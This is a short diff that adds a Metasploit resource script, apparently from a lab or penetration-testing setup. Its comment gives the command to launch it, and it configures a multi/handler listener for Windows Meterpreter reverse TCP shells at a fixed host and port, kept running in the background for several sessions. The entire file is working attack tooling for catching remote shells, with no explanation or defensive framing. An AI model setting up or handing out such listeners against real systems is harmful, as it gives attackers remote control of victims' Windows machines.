@@ -1,0 +1,9 @@
+#
+# [Kali 2.x]:   systemctl start postgresql; msfdb start; msfconsole -q -r '/home/heimdall/windows-meterpreter-staged-reverse-tcp-17433-exe.rc'
+#
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.15.102
+set LPORT 17433
+set ExitOnSession false
+run -j
